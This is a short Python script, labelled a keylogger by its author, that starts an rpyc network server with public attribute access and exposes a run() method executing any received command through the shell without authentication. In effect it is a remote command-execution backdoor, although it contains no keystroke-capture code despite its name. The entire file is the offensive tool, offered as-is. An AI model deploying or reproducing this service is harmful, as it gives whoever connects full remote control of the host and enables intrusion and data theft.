import argparse
import rpyc
from rpyc.utils.server import ThreadedServer
import subprocess



class KeyloggerService(rpyc.Service):
    def on_connect(self, conn):
        print('client connect')

    def on_disconnect(self, conn):
        print('client disconnect')

    def run(self, command):
        try:
            output = subprocess.check_output(command, shell=True)
            print(output)
        except subprocess.CalledProcessError as Error:
            print(Error.returncode)
            print(Error.output)


def main():
    parser = argparse.ArgumentParser(description='Keylogger by jemix')
    parser.add_argument('-port', type=int, help="Enter custom port number")
    args = parser.parse_args()
    port = args.port
    if not port:
        port = 18861
    t = ThreadedServer(KeyloggerService, port=port , protocol_config={'allow_public_attrs': True,})
    t.start()


if __name__ == "__main__":
    main()
